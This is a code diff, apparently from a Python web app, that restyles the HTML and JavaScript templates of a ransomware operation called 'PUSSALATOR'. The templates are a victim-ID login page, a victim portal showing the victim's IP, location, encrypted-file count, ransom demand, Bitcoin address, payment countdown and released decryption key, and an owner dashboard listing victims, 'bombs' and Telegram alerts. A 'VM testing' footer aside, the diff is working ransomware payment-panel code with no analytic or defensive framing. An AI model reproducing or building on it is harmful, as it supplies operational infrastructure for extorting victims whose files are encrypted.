@@ -370,61 +370,82 @@ LOGIN_PAGE = """
     <style>
         * { box-sizing: border-box; }
         body {
-            background: #0a0a0a;
-            color: #00ff00;
-            font-family: 'Courier New', monospace;
+            background: #000000;
+            color: #33ff33;
+            font-family: 'Courier New', 'Terminal', monospace;
             margin: 0;
-            padding: 10px;
+            padding: 0;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100" viewBox="0 0 100 100"><rect width="100" height="100" fill="%23000000"/><path d="M10 10 L90 10 M10 20 L90 20 M10 30 L90 30 M10 40 L90 40 M10 50 L90 50 M10 60 L90 60 M10 70 L90 70 M10 80 L90 80 M10 90 L90 90 M10 10 L10 90 M20 10 L20 90 M30 10 L30 90 M40 10 L40 90 M50 10 L50 90 M60 10 L60 90 M70 10 L70 90 M80 10 L80 90 M90 10 L90 90" stroke="%231a1a1a" stroke-width="0.5" fill="none"/></svg>');
         }
         .container {
             max-width: 600px;
             width: 100%;
             margin: 20px auto;
-            border: 2px solid #ff0000;
-            padding: 30px 20px;
-            background: #000000;
-            box-shadow: 0 0 20px #ff0000;
-            text-align: center;
+            border: 3px solid #ff0000;
+            padding: 20px;
+            background: #0a0a0a;
+            box-shadow: 10px 10px 0 #660000;
+            position: relative;
+        }
+        .container:before {
+            content: "";
+            position: absolute;
+            top: 5px;
+            left: 5px;
+            right: -5px;
+            bottom: -5px;
+            background: #330000;
+            z-index: -1;
         }
         h1 {
-            font-size: 42px;
+            font-size: 48px;
             color: #ff0000;
-            text-shadow: 0 0 10px #ff0000;
             margin: 10px 0;
-            animation: flicker 3s infinite;
+            font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 4px;
+            text-shadow: 3px 3px 0 #660000, 5px 5px 0 #330000;
+            font-family: 'Courier New', monospace;
         }
-        @media (max-width: 480px) { h1 { font-size: 32px; } }
-        @keyframes flicker {
-            0% { opacity: 1; }
-            50% { opacity: 0.9; }
-            51% { opacity: 1; }
-            60% { opacity: 0.95; }
-            100% { opacity: 1; }
+        @media (max-width: 480px) { 
+            h1 { font-size: 36px; } 
         }
         .subtitle {
             color: #ff6666;
             margin-bottom: 25px;
             font-size: 16px;
-            border-bottom: 1px dashed #ff0000;
-            padding-bottom: 15px;
+            border-top: 1px solid #ff0000;
+            border-bottom: 1px solid #ff0000;
+            padding: 10px 0;
+            text-transform: uppercase;
+            font-weight: bold;
+            background: #1a0000;
         }
         .ascii {
             color: #ff0000;
-            font-size: 10px;
+            font-size: 12px;
             line-height: 1.2;
             white-space: pre;
             margin: 15px 0;
             overflow-x: auto;
+            background: #000000;
+            padding: 10px;
+            border: 1px solid #330000;
         }
-        .input-group { margin: 25px 0; }
+        .input-group { 
+            margin: 30px 0; 
+            background: #1a0000;
+            padding: 20px;
+            border: 1px solid #330000;
+        }
         .input-field {
-            background: #111;
+            background: #000000;
             border: 2px solid #ff0000;
-            color: #00ff00;
+            color: #33ff33;
             padding: 12px 15px;
             font-family: 'Courier New', monospace;
             font-size: 16px;
@@ -436,46 +457,48 @@ LOGIN_PAGE = """
         }
         .input-field:focus {
             outline: none;
-            border-color: #00ff00;
-            box-shadow: 0 0 15px #ff0000;
+            border-color: #ff6666;
+            background: #0a0a0a;
         }
         .button {
-            background: #ff0000;
-            color: black;
-            border: none;
+            background: #cc0000;
+            color: #000000;
+            border: 2px solid #ff0000;
             padding: 12px 30px;
             font-family: 'Courier New', monospace;
             font-weight: bold;
             font-size: 16px;
             cursor: pointer;
             margin: 10px;
-            transition: 0.3s;
-            border-radius: 3px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
         }
         .button:hover {
-            background: #ff3333;
-            box-shadow: 0 0 15px #ff0000;
-            transform: scale(1.02);
+            background: #ff0000;
+            border-color: #ffffff;
         }
         .stats {
-            color: #ff6666;
+            color: #ff9999;
             margin-top: 25px;
-            font-size: 13px;
+            font-size: 12px;
             padding: 15px;
-            background: #111;
-            border: 1px solid #330000;
-            border-radius: 5px;
+            background: #0a0000;
+            border: 2px solid #330000;
+            font-family: 'Courier New', monospace;
         }
         .message {
             color: #ff6666;
             margin-top: 15px;
             min-height: 25px;
             font-size: 14px;
+            font-weight: bold;
         }
         .footer {
             margin-top: 20px;
-            font-size: 10px;
-            color: #333;
+            font-size: 9px;
+            color: #330000;
+            border-top: 1px solid #330000;
+            padding-top: 10px;
         }
         .stats-grid {
             display: grid;
@@ -486,49 +509,61 @@ LOGIN_PAGE = """
         .stat-item {
             background: #1a0000;
             padding: 8px;
-            border-radius: 3px;
+            border: 1px solid #330000;
         }
         .stat-label {
-            font-size: 11px;
-            color: #ff9999;
+            font-size: 10px;
+            color: #cc6666;
+            text-transform: uppercase;
         }
         .stat-number {
-            font-size: 18px;
+            font-size: 24px;
             color: #ff0000;
             font-weight: bold;
+            font-family: 'Courier New', monospace;
+        }
+        .blink {
+            animation: blink 2s step-end infinite;
+        }
+        @keyframes blink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0; }
         }
     </style>
 </head>
 <body>
     <div class="container">
         <div class="ascii">
-    /\\____/\\    
-   (  o  o  )   
-   (   ==   )   
-    (______)    
+    ,     ,                   
+    |\\---/|                   
+   /  , ,  \                  
+  =||  =  ||=                 
+    ||___||                   
+    /     \                   
+   (_______)
         </div>
         
         <h1>PUSSALATOR</h1>
-        <div class="subtitle">> ENTER ACCESS ID <</div>
+        <div class="subtitle">>> ENTER ACCESS ID <<</div>
         
         <div class="input-group">
-            <input type="text" id="access_id" class="input-field" placeholder="ENTER ID" autocomplete="off" onkeypress="handleKey(event)">
-            <button class="button" onclick="submitId()">SUBMIT</button>
+            <input type="text" id="access_id" class="input-field" placeholder="_" autocomplete="off" onkeypress="handleKey(event)">
+            <button class="button" onclick="submitId()">>> SUBMIT <<</button>
         </div>
         
         <div id="message" class="message"></div>
         
         <div class="stats" id="stats">
-            <div>Loading system data...</div>
+            <span class="blink">></span> Loading system data...
         </div>
         
         <div class="footer">
-            SYSTEM v1.0 | FOR VM TESTING ONLY
+            SYSTEM v1.0 | FOR VM TESTING ONLY | 2000
         </div>
     </div>
 
     <script>
-        const OWNER_EMAIL = 'owner@pussalator.com';
+        var OWNER_EMAIL = 'owner@pussalator.com';
         
         function handleKey(e) {
             if (e.key === 'Enter') {
@@ -536,56 +571,55 @@ LOGIN_PAGE = """
             }
         }
         
-        async function submitId() {
-            const id = document.getElementById('access_id').value.trim();
-            const messageDiv = document.getElementById('message');
+        function submitId() {
+            var id = document.getElementById('access_id').value.trim();
+            var messageDiv = document.getElementById('message');
             
             if (!id) {
-                messageDiv.innerHTML = 'Please enter an ID';
+                messageDiv.innerHTML = '> ERROR: Please enter an ID';
                 return;
             }
             
-            // Check if it's a victim ID
-            try {
-                const response = await fetch(`/api/victim/${id}`);
-                if (response.status === 200) {
-                    window.location.href = `/victim/${id}`;
-                } else {
-                    messageDiv.innerHTML = 'Invalid ID';
-                    document.getElementById('access_id').value = '';
-                }
-            } catch(e) {
-                messageDiv.innerHTML = 'Connection error';
-            }
+            fetch('/api/victim/' + id)
+                .then(function(response) {
+                    if (response.status === 200) {
+                        window.location.href = '/victim/' + id;
+                    } else {
+                        messageDiv.innerHTML = '> ERROR: Invalid ID';
+                        document.getElementById('access_id').value = '';
+                    }
+                })
+                .catch(function() {
+                    messageDiv.innerHTML = '> ERROR: Connection failed';
+                });
         }
         
-        async function loadStats() {
-            try {
-                const response = await fetch('/api/stats');
-                const stats = await response.json();
-                
-                document.getElementById('stats').innerHTML = `
-                    <div class="stats-grid">
-                        <div class="stat-item">
-                            <div class="stat-label">TOTAL</div>
-                            <div class="stat-number">${stats.total}</div>
-                        </div>
-                        <div class="stat-item">
-                            <div class="stat-label">PAID</div>
-                            <div class="stat-number">${stats.paid}</div>
-                        </div>
-                        <div class="stat-item">
-                            <div class="stat-label">ACTIVE</div>
-                            <div class="stat-number">${stats.active_bombs || 0}</div>
-                        </div>
-                    </div>
-                    <div style="margin-top: 10px; font-size: 11px;">
-                        Files encrypted: ${(stats.total_files || 0).toLocaleString()}
-                    </div>
-                `;
-            } catch(e) {
-                document.getElementById('stats').innerHTML = 'System data unavailable';
-            }
+        function loadStats() {
+            fetch('/api/stats')
+                .then(function(response) { return response.json(); })
+                .then(function(stats) {
+                    document.getElementById('stats').innerHTML = '' +
+                        '<div class="stats-grid">' +
+                        '<div class="stat-item">' +
+                        '<div class="stat-label">TOTAL</div>' +
+                        '<div class="stat-number">' + stats.total + '</div>' +
+                        '</div>' +
+                        '<div class="stat-item">' +
+                        '<div class="stat-label">PAID</div>' +
+                        '<div class="stat-number">' + stats.paid + '</div>' +
+                        '</div>' +
+                        '<div class="stat-item">' +
+                        '<div class="stat-label">ACTIVE</div>' +
+                        '<div class="stat-number">' + (stats.active_bombs || 0) + '</div>' +
+                        '</div>' +
+                        '</div>' +
+                        '<div style="margin-top: 10px; font-size: 10px;">' +
+                        'FILES ENCRYPTED: ' + (stats.total_files || 0).toLocaleString() +
+                        '</div>';
+                })
+                .catch(function() {
+                    document.getElementById('stats').innerHTML = '> SYSTEM DATA UNAVAILABLE';
+                });
         }
         
         loadStats();
@@ -599,126 +633,141 @@ VICTIM_PAGE_TEMPLATE = """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Victim Status - PUSSALATOR</title>
+    <title>PUSSALATOR - VICTIM ACCESS</title>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         * { box-sizing: border-box; }
         body {
-            background: #0a0a0a;
-            color: #00ff00;
-            font-family: 'Courier New', monospace;
+            background: #000000;
+            color: #33ff33;
+            font-family: 'Courier New', 'Terminal', monospace;
             margin: 0;
-            padding: 15px;
+            padding: 0;
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="50" height="50" viewBox="0 0 50 50"><rect width="50" height="50" fill="%23000000"/><circle cx="25" cy="25" r="1" fill="%231a0000"/></svg>');
         }
         .container {
             max-width: 700px;
             width: 100%;
             margin: 20px auto;
-            border: 2px solid #ff0000;
-            padding: 25px 20px;
+            border: 3px solid #ff0000;
+            padding: 20px;
+            background: #0a0a0a;
+            box-shadow: 10px 10px 0 #660000;
+            position: relative;
+        }
+        .container:before {
+            content: "VICTIM";
+            position: absolute;
+            top: -10px;
+            left: 20px;
             background: #000000;
-            box-shadow: 0 0 20px #ff0000;
+            color: #ff0000;
+            padding: 0 10px;
+            font-size: 12px;
+            font-weight: bold;
         }
         h1 {
             color: #ff0000;
             text-align: center;
             font-size: 32px;
             margin: 5px 0 20px;
-            text-shadow: 0 0 8px #ff0000;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            border-bottom: 2px solid #330000;
+            padding-bottom: 10px;
         }
         @media (max-width: 480px) { h1 { font-size: 24px; } }
         .info-box {
-            background: #111;
-            border: 1px solid #330000;
+            background: #0a0000;
+            border: 2px solid #330000;
             padding: 15px;
             margin: 15px 0;
-            border-radius: 5px;
             font-size: 14px;
-            line-height: 1.6;
         }
         .info-row {
             display: flex;
             justify-content: space-between;
             padding: 5px 0;
-            border-bottom: 1px solid #222;
+            border-bottom: 1px dotted #330000;
         }
         .info-label {
-            color: #ff9999;
+            color: #cc6666;
             font-weight: bold;
+            text-transform: uppercase;
         }
         .info-value {
-            color: #00ff00;
+            color: #33ff33;
             word-break: break-word;
             text-align: right;
+            font-family: 'Courier New', monospace;
         }
         .key-box {
-            background: #003300;
-            border: 2px solid #00ff00;
+            background: #001100;
+            border: 2px solid #33ff33;
             padding: 20px;
             margin: 20px 0;
             word-break: break-all;
             font-family: monospace;
             font-size: 14px;
-            border-radius: 5px;
-            color: #00ff00;
+            color: #33ff33;
         }
         .status-box {
             text-align: center;
             padding: 20px;
             margin: 15px 0;
-            border-radius: 5px;
-            font-size: 24px;
+            font-size: 28px;
             font-weight: bold;
+            text-transform: uppercase;
+            letter-spacing: 4px;
         }
         .status-paid {
-            background: #003300;
-            color: #00ff00;
-            border: 2px solid #00ff00;
+            background: #001100;
+            color: #33ff33;
+            border: 3px solid #33ff33;
         }
         .status-unpaid {
-            background: #333300;
-            color: #ffff00;
-            border: 2px solid #ffff00;
+            background: #221100;
+            color: #ffaa00;
+            border: 3px solid #ffaa00;
         }
         .status-expired {
-            background: #330000;
+            background: #220000;
             color: #ff6666;
-            border: 2px solid #ff6666;
+            border: 3px solid #ff6666;
         }
         .timer {
-            font-size: 36px;
+            font-size: 48px;
             text-align: center;
             color: #ff0000;
             margin: 20px 0;
-            padding: 15px;
+            padding: 20px;
             background: #1a0000;
-            border-radius: 5px;
+            border: 2px solid #ff0000;
             font-weight: bold;
+            font-family: 'Courier New', monospace;
         }
-        @media (max-width: 480px) { .timer { font-size: 28px; } }
+        @media (max-width: 480px) { .timer { font-size: 36px; } }
         .button {
-            background: #ff0000;
-            color: black;
-            border: none;
-            padding: 12px 25px;
+            background: #cc0000;
+            color: #000000;
+            border: 2px solid #ff0000;
+            padding: 10px 20px;
             font-family: 'Courier New', monospace;
             font-weight: bold;
             font-size: 14px;
             cursor: pointer;
             margin: 10px 5px;
-            border-radius: 3px;
-            transition: 0.3s;
+            text-transform: uppercase;
         }
         .button:hover {
-            background: #ff3333;
-            box-shadow: 0 0 15px #ff0000;
+            background: #ff0000;
         }
-        .button-small { padding: 8px 15px; font-size: 12px; }
+        .button-small { padding: 5px 10px; font-size: 11px; }
         .back-link {
             display: inline-block;
             margin-top: 20px;
@@ -726,117 +775,118 @@ VICTIM_PAGE_TEMPLATE = """
             text-decoration: none;
             font-size: 14px;
             padding: 8px 15px;
-            border: 1px solid #ff6666;
-            border-radius: 3px;
+            border: 2px solid #ff6666;
+            text-transform: uppercase;
         }
         .back-link:hover {
             background: #ff0000;
-            color: black;
+            color: #000000;
             border-color: #ff0000;
         }
         .btc-address {
-            background: #222;
-            padding: 10px;
+            background: #111111;
+            padding: 15px;
             font-family: monospace;
             font-size: 14px;
             color: #ffaa00;
             word-break: break-all;
-            border-radius: 3px;
+            border: 2px solid #ffaa00;
             margin: 10px 0;
         }
-        .copy-btn {
-            background: #333;
-            color: #ff6666;
-            border: 1px solid #ff6666;
-            padding: 5px 10px;
+        .warning {
+            color: #ff0000;
+            text-align: center;
             font-size: 12px;
-            cursor: pointer;
-            border-radius: 3px;
-        }
-        .copy-btn:hover {
-            background: #ff0000;
-            color: black;
+            margin-top: 10px;
+            border: 1px solid #ff0000;
+            padding: 5px;
+            background: #1a0000;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🔐 VICTIM PORTAL</h1>
-        <div id="content" style="min-height: 200px;">Loading...</div>
+        <h1> >> VICTIM PORTAL << </h1>
+        <div id="content" style="min-height: 200px;">> LOADING...</div>
         <div style="text-align: center;">
-            <a href="/" class="back-link">← BACK TO LOGIN</a>
+            <a href="/" class="back-link"><< BACK TO LOGIN >></a>
         </div>
+        <div class="warning">ALL FILES ENCRYPTED. DO NOT ATTEMPT TO DECRYPT.</div>
     </div>
 
     <script>
-        const VICTIM_ID = '{{ victim_id }}';
+        var VICTIM_ID = '{{ victim_id }}';
         
-        async function loadStatus() {
-            try {
-                const response = await fetch(`/api/victim/${VICTIM_ID}`);
-                if (!response.ok) throw new Error('Victim not found');
-                const v = await response.json();
-                
-                let html = '<div class="info-box">';
-                html += `
-                    <div class="info-row"><span class="info-label">Victim ID:</span><span class="info-value">${v.id}</span></div>
-                    <div class="info-row"><span class="info-label">Hostname:</span><span class="info-value">${v.hostname || 'Unknown'}</span></div>
-                    <div class="info-row"><span class="info-label">IP Address:</span><span class="info-value">${v.ip || '0.0.0.0'}</span></div>
-                    <div class="info-row"><span class="info-label">Location:</span><span class="info-value">${v.city || 'Unknown'}, ${v.country || 'Unknown'}</span></div>
-                    <div class="info-row"><span class="info-label">Files Encrypted:</span><span class="info-value">${(v.files || 0).toLocaleString()}</span></div>
-                    <div class="info-row" style="margin-top:10px;border-top:2px solid #ff0000;padding-top:10px;">
-                        <span class="info-label">Ransom:</span><span class="info-value" style="color:#ffaa00;">${v.ransom || '0.5 BTC'}</span>
-                    </div>
-                    <div class="info-row">
-                        <span class="info-label">BTC Address:</span><span class="info-value" style="font-size:12px;">${v.wallet || '1PussWalletVMTest'}</span>
-                    </div>
-                </div>`;
-                
-                if (v.status === 'paid') {
-                    html += `<div class="status-box status-paid">✓ PAID ✓</div>`;
-                    if (v.key) {
-                        html += `<div class="key-box"><strong>🔑 KEY:</strong><br>${v.key}</div>`;
-                        html += `<div style="text-align:center;"><button class="button button-small" onclick="copyKey('${v.key}')">📋 COPY</button></div>`;
+        function loadStatus() {
+            fetch('/api/victim/' + VICTIM_ID)
+                .then(function(response) {
+                    if (!response.ok) throw new Error('Not found');
+                    return response.json();
+                })
+                .then(function(v) {
+                    var html = '<div class="info-box">';
+                    html += '' +
+                        '<div class="info-row"><span class="info-label">VICTIM ID:</span><span class="info-value">' + v.id + '</span></div>' +
+                        '<div class="info-row"><span class="info-label">HOSTNAME:</span><span class="info-value">' + (v.hostname || 'UNKNOWN') + '</span></div>' +
+                        '<div class="info-row"><span class="info-label">IP ADDRESS:</span><span class="info-value">' + (v.ip || '0.0.0.0') + '</span></div>' +
+                        '<div class="info-row"><span class="info-label">LOCATION:</span><span class="info-value">' + (v.city || 'UNKNOWN') + ', ' + (v.country || 'UNKNOWN') + '</span></div>' +
+                        '<div class="info-row"><span class="info-label">FILES ENCRYPTED:</span><span class="info-value">' + (v.files || 0).toLocaleString() + '</span></div>' +
+                        '<div class="info-row" style="margin-top:10px;border-top:2px solid #ff0000;padding-top:10px;">' +
+                        '<span class="info-label">RANSOM:</span><span class="info-value" style="color:#ffaa00;">' + (v.ransom || '0.5 BTC') + '</span></div>' +
+                        '<div class="info-row">' +
+                        '<span class="info-label">BTC ADDRESS:</span><span class="info-value" style="font-size:11px;">' + (v.wallet || '1PussWalletVMTest') + '</span></div>' +
+                    '</div>';
+                    
+                    if (v.status === 'paid') {
+                        html += '<div class="status-box status-paid">>> PAID <<</div>';
+                        if (v.key) {
+                            html += '<div class="key-box"><strong>DECRYPTION KEY:</strong><br><br>' + v.key + '</div>';
+                            html += '<div style="text-align:center;"><button class="button button-small" onclick="copyKey(\'' + v.key + '\')">[ COPY KEY ]</button></div>';
+                        }
+                    } else if (v.status === 'expired') {
+                        html += '<div class="status-box status-expired">>> EXPIRED <<</div>';
+                    } else {
+                        html += '<div class="status-box status-unpaid">>> UNPAID <<</div>';
+                        html += '<div class="btc-address" id="btcAddress">' + (v.wallet || '1PussWalletVMTest') + '</div>';
+                        html += '<div style="text-align:center;"><button class="button button-small" onclick="copyBtc()">[ COPY BTC ]</button></div>';
+                        html += '<div class="timer" id="timer">--:--:--</div>';
                     }
-                } else if (v.status === 'expired') {
-                    html += `<div class="status-box status-expired">✗ EXPIRED ✗</div>`;
-                } else {
-                    html += `<div class="status-box status-unpaid">⏳ UNPAID ⏳</div>`;
-                    html += `<div class="btc-address" id="btcAddress">${v.wallet || '1PussWalletVMTest'}</div>`;
-                    html += `<div style="text-align:center;"><button class="copy-btn" onclick="copyBtc()">📋 COPY BTC</button></div>`;
-                    html += `<div class="timer" id="timer">Loading...</div>`;
-                }
-                
-                document.getElementById('content').innerHTML = html;
-                
-                if (v.status === 'unpaid' && v.deadline) updateTimer(v.deadline);
-                
-            } catch(e) {
-                document.getElementById('content').innerHTML = `<div style="color:#ff0000;padding:40px;text-align:center;">Error loading data</div>`;
-            }
+                    
+                    document.getElementById('content').innerHTML = html;
+                    
+                    if (v.status === 'unpaid' && v.deadline) updateTimer(v.deadline);
+                })
+                .catch(function() {
+                    document.getElementById('content').innerHTML = '<div style="color:#ff0000;padding:40px;text-align:center;">> ERROR: DATA CORRUPTED <</div>';
+                });
         }
         
         function updateTimer(deadlineStr) {
-            const deadline = new Date(deadlineStr).getTime();
+            var deadline = new Date(deadlineStr).getTime();
             function tick() {
-                const diff = deadline - new Date().getTime();
+                var diff = deadline - new Date().getTime();
                 if (diff <= 0) {
-                    document.getElementById('timer').innerHTML = '⏰ EXPIRED ⏰';
-                    setTimeout(() => location.reload(), 2000);
+                    document.getElementById('timer').innerHTML = '>> EXPIRED <<';
+                    setTimeout(function() { location.reload(); }, 2000);
                     return;
                 }
-                const h = Math.floor(diff/(1000*60*60));
-                const m = Math.floor((diff%(1000*60*60))/(1000*60));
-                const s = Math.floor((diff%(1000*60))/1000);
-                document.getElementById('timer').innerHTML = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
+                var h = Math.floor(diff/(1000*60*60));
+                var m = Math.floor((diff%(1000*60*60))/(1000*60));
+                var s = Math.floor((diff%(1000*60))/1000);
+                document.getElementById('timer').innerHTML = 
+                    (h < 10 ? '0' + h : h) + ':' + 
+                    (m < 10 ? '0' + m : m) + ':' + 
+                    (s < 10 ? '0' + s : s);
             }
             tick();
             setInterval(tick, 1000);
         }
         
-        function copyKey(k) { navigator.clipboard.writeText(k).then(() => alert('✓ Key copied')); }
+        function copyKey(k) { 
+            navigator.clipboard.writeText(k).then(function() { alert('KEY COPIED'); }); 
+        }
         function copyBtc() { 
-            navigator.clipboard.writeText(document.getElementById('btcAddress').innerText).then(() => alert('✓ BTC address copied')); 
+            navigator.clipboard.writeText(document.getElementById('btcAddress').innerText).then(function() { alert('BTC ADDRESS COPIED'); }); 
         }
         
         loadStatus();
@@ -850,59 +900,71 @@ OWNER_DASHBOARD_TEMPLATE = """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Owner Dashboard - PUSSALATOR</title>
+    <title>PUSSALATOR - OWNER CONTROL</title>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
         body {
-            background: #0a0a0a;
-            color: #00ff00;
-            font-family: 'Courier New', monospace;
+            background: #000000;
+            color: #33ff33;
+            font-family: 'Courier New', 'Terminal', monospace;
             margin: 0;
-            padding: 15px;
+            padding: 0;
+            background-image: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" viewBox="0 0 40 40"><rect width="40" height="40" fill="%23000000"/><path d="M0 0 L40 40 M40 0 L0 40" stroke="%231a0000" stroke-width="0.5"/></svg>');
         }
         .navbar {
             background: #1a0000;
             padding: 15px;
-            border-bottom: 2px solid #ff0000;
+            border-bottom: 3px solid #ff0000;
             display: flex;
             justify-content: space-between;
             align-items: center;
             margin-bottom: 20px;
+            border-top: 1px solid #330000;
         }
         .navbar h1 {
             color: #ff0000;
             margin: 0;
             font-size: 28px;
+            text-transform: uppercase;
+            letter-spacing: 3px;
+            text-shadow: 2px 2px 0 #330000;
         }
         .nav-links button {
-            background: #ff0000;
-            color: black;
-            border: none;
+            background: #330000;
+            color: #ff6666;
+            border: 2px solid #ff0000;
             padding: 8px 15px;
             margin-left: 10px;
             cursor: pointer;
             font-family: 'Courier New', monospace;
             font-weight: bold;
+            text-transform: uppercase;
         }
         .nav-links button:hover {
-            background: #ff6666;
+            background: #ff0000;
+            color: #000000;
         }
         .login-form {
             background: #1a0000;
-            border: 1px solid #ff0000;
+            border: 3px solid #ff0000;
             padding: 30px;
             max-width: 400px;
             margin: 100px auto;
             text-align: center;
+            box-shadow: 10px 10px 0 #330000;
+        }
+        .login-form h2 {
+            color: #ff0000;
+            margin-top: 0;
         }
         .login-form input {
             width: 100%;
             padding: 10px;
             margin: 10px 0;
-            background: #111;
-            border: 1px solid #ff0000;
-            color: #00ff00;
+            background: #000000;
+            border: 2px solid #ff0000;
+            color: #33ff33;
             font-family: 'Courier New', monospace;
         }
         .stats-grid {
@@ -910,22 +972,27 @@ OWNER_DASHBOARD_TEMPLATE = """
             grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
             gap: 15px;
             margin-bottom: 25px;
+            padding: 0 15px;
         }
         .stat-card {
             background: #1a0000;
-            border: 1px solid #ff0000;
+            border: 2px solid #ff0000;
             padding: 15px;
             text-align: center;
+            box-shadow: 5px 5px 0 #330000;
         }
         .stat-value {
-            font-size: 28px;
+            font-size: 32px;
             color: #ff0000;
             font-weight: bold;
+            font-family: 'Courier New', monospace;
         }
         .table-container {
             overflow-x: auto;
             background: #1a0000;
-            border: 1px solid #ff0000;
+            border: 2px solid #ff0000;
+            margin: 0 15px;
+            box-shadow: 5px 5px 0 #330000;
         }
         table {
             width: 100%;
@@ -937,35 +1004,40 @@ OWNER_DASHBOARD_TEMPLATE = """
             color: #ff0000;
             padding: 12px;
             text-align: left;
+            border-bottom: 2px solid #ff0000;
+            text-transform: uppercase;
         }
         td {
             padding: 10px 12px;
             border-bottom: 1px solid #330000;
+            color: #33ff33;
         }
-        .status-paid { color: #00ff00; }
-        .status-unpaid { color: #ffff00; }
+        .status-paid { color: #33ff33; }
+        .status-unpaid { color: #ffaa00; }
         .status-expired { color: #ff6666; }
         .bomb-active {
             color: #ff0000;
-            animation: blink 1s infinite;
+            font-weight: bold;
+            animation: blink 1s step-end infinite;
         }
         @keyframes blink {
-            0% { opacity: 1; }
+            0%, 100% { opacity: 1; }
             50% { opacity: 0.3; }
-            100% { opacity: 1; }
         }
         .action-btn {
-            background: #333;
+            background: #220000;
             color: #ff6666;
             border: 1px solid #ff0000;
             padding: 4px 8px;
             margin: 2px;
             cursor: pointer;
             font-size: 11px;
+            font-family: 'Courier New', monospace;
+            text-transform: uppercase;
         }
         .action-btn:hover {
             background: #ff0000;
-            color: black;
+            color: #000000;
         }
         .modal {
             display: none;
@@ -982,12 +1054,13 @@ OWNER_DASHBOARD_TEMPLATE = """
         .modal.show { display: flex; }
         .modal-content {
             background: #1a0000;
-            border: 2px solid #ff0000;
+            border: 3px solid #ff0000;
             padding: 25px;
             max-width: 600px;
             width: 90%;
             max-height: 80vh;
             overflow-y: auto;
+            box-shadow: 10px 10px 0 #330000;
         }
         .close {
             color: #ff6666;
@@ -995,51 +1068,64 @@ OWNER_DASHBOARD_TEMPLATE = """
             cursor: pointer;
             float: right;
         }
-        .telegram-status {
-            background: #1a1a1a;
-            border: 1px solid #ff0000;
-            padding: 10px;
-            margin-bottom: 15px;
+        .close:hover {
+            color: #ff0000;
         }
-        .telegram-enabled { color: #00ff00; }
+        .telegram-status {
+            background: #0a0000;
+            border: 2px solid #ff0000;
+            padding: 10px;
+            margin: 15px;
+            font-size: 12px;
+        }
+        .telegram-enabled { color: #33ff33; }
         .telegram-disabled { color: #ff0000; }
         .error { color: #ff0000; margin: 10px 0; }
+        .section-title {
+            color: #ff0000;
+            margin-left: 15px;
+            text-transform: uppercase;
+            border-left: 4px solid #ff0000;
+            padding-left: 10px;
+        }
     </style>
 </head>
 <body>
     <div id="loginView" style="display: block;">
         <div class="login-form">
-            <h2 style="color:#ff0000;">👑 OWNER LOGIN</h2>
-            <input type="email" id="email" placeholder="Email" value="owner@pussalator.com">
-            <input type="password" id="password" placeholder="Password">
-            <button class="action-btn" onclick="login()" style="width:100%; padding:10px;">LOGIN</button>
+            <h2>OWNER LOGIN</h2>
+            <input type="email" id="email" placeholder="EMAIL" value="owner@pussalator.com">
+            <input type="password" id="password" placeholder="PASSWORD">
+            <button class="action-btn" onclick="login()" style="width:100%; padding:10px;">>> LOGIN <<</button>
             <div id="loginError" class="error"></div>
         </div>
     </div>
     
     <div id="dashboardView" style="display: none;">
         <div class="navbar">
-            <h1>⚙️ OWNER DASHBOARD</h1>
+            <h1>OWNER CONTROL</h1>
             <div class="nav-links">
-                <button onclick="loadData()">🔄 REFRESH</button>
-                <button onclick="testTelegram()">📱 TEST TELEGRAM</button>
-                <button onclick="logout()">🚪 LOGOUT</button>
+                <button onclick="loadData()">[ REFRESH ]</button>
+                <button onclick="testTelegram()">[ TEST TELEGRAM ]</button>
+                <button onclick="logout()">[ LOGOUT ]</button>
             </div>
         </div>
         
         <div class="telegram-status" id="telegramStatus">
-            Loading Telegram status...
+            > LOADING TELEGRAM STATUS...
         </div>
         
+        <h3 class="section-title">SYSTEM STATISTICS</h3>
         <div class="stats-grid" id="statsGrid">
-            <div class="stat-card"><div class="stat-value" id="totalVictims">0</div><div class="stat-label">TOTAL</div></div>
-            <div class="stat-card"><div class="stat-value" id="paidVictims">0</div><div class="stat-label">PAID</div></div>
-            <div class="stat-card"><div class="stat-value" id="unpaidVictims">0</div><div class="stat-label">UNPAID</div></div>
-            <div class="stat-card"><div class="stat-value" id="expiredVictims">0</div><div class="stat-label">EXPIRED</div></div>
-            <div class="stat-card"><div class="stat-value" id="totalFiles">0</div><div class="stat-label">FILES</div></div>
-            <div class="stat-card"><div class="stat-value" id="activeBombs">0</div><div class="stat-label">BOMBS</div></div>
+            <div class="stat-card"><div class="stat-value" id="totalVictims">0</div><div>TOTAL</div></div>
+            <div class="stat-card"><div class="stat-value" id="paidVictims">0</div><div>PAID</div></div>
+            <div class="stat-card"><div class="stat-value" id="unpaidVictims">0</div><div>UNPAID</div></div>
+            <div class="stat-card"><div class="stat-value" id="expiredVictims">0</div><div>EXPIRED</div></div>
+            <div class="stat-card"><div class="stat-value" id="totalFiles">0</div><div>FILES</div></div>
+            <div class="stat-card"><div class="stat-value" id="activeBombs">0</div><div>BOMBS</div></div>
         </div>
         
+        <h3 class="section-title">ACTIVE VICTIMS</h3>
         <div class="table-container">
             <table id="victimsTable">
                 <thead>
@@ -1054,179 +1140,187 @@ OWNER_DASHBOARD_TEMPLATE = """
                     </tr>
                 </thead>
                 <tbody id="tableBody">
-                    <tr><td colspan="7" style="text-align:center;padding:40px;">Loading victims...</td></tr>
+                    <tr><td colspan="7" style="text-align:center;padding:40px;">> LOADING VICTIMS...</td></tr>
                 </tbody>
             </table>
         </div>
